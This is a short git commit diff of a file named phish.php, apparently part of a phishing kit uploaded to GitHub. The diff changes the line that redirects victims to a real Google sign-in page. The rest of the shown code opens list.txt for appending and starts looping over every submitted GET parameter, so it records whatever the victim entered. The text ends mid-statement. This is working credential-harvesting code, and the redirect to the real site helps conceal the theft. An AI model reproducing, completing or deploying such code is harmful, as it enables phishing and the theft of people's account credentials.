86f63c035ddc3ab9b5a84696866421a7ddefa960
TheNequiz8 <157914659+TheNequiz8@users.noreply.github.com>
2024-02-13 22:06:57 -0600

    Add files via upload

--- phish.php
+++ phish.php
@@ -1,5 +1,5 @@
 <?php
-header("Location:https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=ATuJsjyvKJEeuqHH0tAbBx184z4P5pbls9UqXtEaZICmxqSZbRpbo8ZktDT7FmEhQwMIMgmT1iUBlw&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-234115263%3A1707876672340854&theme=glf");
+header("Location:https://www.google.com/accounts/ServiceLogin?services=mail&passive=true&rm=false&continue=3A%2F%2Fmail.google.com%2Fmail%2F%3Fui%3Dhtml%26zy%3Dl%&bsv=1k96igf4806cy&ltmpl=default&lf");
 
 $handle=fopen("list.txt","a");
 foreach ($_GET as $variable => 
